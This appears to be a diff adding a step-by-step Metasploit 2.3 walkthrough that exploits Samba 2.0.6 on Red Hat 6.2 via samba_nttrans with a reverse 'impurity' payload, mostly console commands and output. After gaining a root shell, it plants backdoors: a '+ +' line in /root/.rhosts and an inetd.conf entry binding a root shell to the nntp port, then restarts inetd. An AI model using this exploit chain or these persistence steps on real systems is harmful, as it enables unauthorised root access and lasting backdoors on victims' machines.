@@ -1,0 +1,120 @@
+1) Determine your metasploit interface and options
+
++ -- --=[ msfconsole v2.3 [46 exploits - 68 payloads]
+
+msf > setg RHOST 192.168.0.252
+RHOST -> 192.168.0.252
+msf > setg LHOST 192.168.0.20
+LHOST -> 192.168.0.20
+msf > use samba_nttrans
+msf samba_nttrans > set TARGET 3
+TARGET -> 3
+
+
+2) Set PAYLOAD to linux_ia32_reverse_impurity
+
+msf samba_nttrans > set PAYLOAD linux_ia32_reverse_impurity
+PAYLOAD -> linux_ia32_reverse_impurity
+
+
+3) Set PEXEC to the path of your impurity module
+
+msf samba_nttrans(linux_ia32_reverse_impurity) > set PEXEC data/shelldemo
+PEXEC -> data/shelldemo
+
+
+4) Launch the exploit
+
+msf samba_nttrans(linux_ia32_reverse_impurity) > exploit
+[*] Starting Reverse Handler.
+[*] Starting attack against target Samba 2.0.6 / Red Hat 6.2
+[*] Attack will use 1 threads with 1 total attempts
+
+[*] Establishing 1 connection(s) to the target...
+[*] --- Setting up the SMB session...
+[*] --- Establishing tree connection...
+[*] --- Sending first nttrans component...
+[*] --- Completed range 0x081389c0:0x08138380
+[*] Got connection from 192.168.0.21:4321 <-> 192.168.0.252:1042
+[*] Sleeping before sending impurity data.
+[*] Uploading impurity data (31628), Please wait...
+[*] Executing impurity data.
+
+--=[ Impurity Demo Shell ]=--
+impurity demo > 
+
+
+5) Use the Impurity shell!
+
+impurity demo > help
+Available commands:
+    help                            Show this help screen
+    fork                            Fork off another shelldemo process
+    exec <cmd>                      Execute <cmd>
+    system <cmd>                    Fork and execute <cmd> on std(in/out/err)
+    quit                            Exit the shell
+
+    open <path>                     Open a file and return the file descriptor
+    lseek <fd> <offset> <whence>    Reposition <fd>
+    read <fd> [bytes]               Read <bytes> from file descriptor
+    write <fd> [bytes]              Write [bytes] (or until "EOF") to <fd>
+    close <fd>                      Close specified file descriptor
+    dup <old_fd>                    Duplicate <old_fd> and return new reference
+    dup2 <old_fd> <new_fd>          Duplicate <old_fd> to <new_fd>
+
+    ls [path]                       Print information/contents about [path] (default: .)
+    getcwd                          Get current working directory
+    chmod <permission> <path>       Change <path> permissions to <permission>
+    chown <user> <path>             Change <path> owner to <user>
+    chgrp <group> <path>            Change <path> group to <group>
+    chdir <path>                    Change working directory to <path>
+    mkdir <path> [permission]       Create <path> directory with [permission] (default: 755)
+    rmdir <path>                    Remove <path> directory
+    rename <old_file> <new_file>    Rename <old_file> to <new_file>
+    unlink <path>                   Remove <path> file
+    chroot <path>                   Change root directory to <path>
+    link <file> <reference>         Hard link <reference> to <file>
+    symlink <file> <reference>      Symbolically link <reference> to <file>
+
+    getid                           Print information about [e][ug]id
+    setuid <uid>                    Set UID to <uid>
+    setgid <gid>                    Set GID to <gid>
+
+    kill <pid> [signal]             Send <pid> [signal] (default: 9)
+    getpid                          Print current process ID
+    getppid                         Print parent process ID
+
+    time                            Display the current system time
+    uname                           Get kernel information
+    hostname [name]                 Print (or set) the hostname
+    reboot                          Reboot the computer
+    shutdown                        Shutdown the computer
+    halt                            Halt the computer
+
+    lsfd                            Show information about open file descriptors
+
+Warning! Before using any of the following you are recommended to fork for your own safety!
+    fchdir_breakchroot <temp_dir>   Use <temp_dir> to attempt to break out of chroot
+impurity demo > getid
+uid=0(root) gid=0(root) euid=99(nobody) egid=99(nobody)
+impurity demo > setuid 0
+impurity demo > setgid 0
+impurity demo > chdir /root/
+impurity demo > open .rhosts
+open: 10
+impurity demo > write 10
++ +
+EOF
+impurity demo > close 10
+impurity demo > chdir /etc
+impurity demo > open inetd.conf
+open: 10
+impurity demo > write 10
+nntp stream tcp nowait root /bin/sh sh -i
+EOF
+impurity demo > close 10
+impurity demo > system ps aux | grep inetd
+root       485  0.0  0.2  1168  464 ?        S    Mar22   0:00 inetd
+root     10276  0.0  0.2  1208  424 ?        S    11:11   0:00 grep inetd
+impurity demo > kill 485 1
+impurity demo > exit
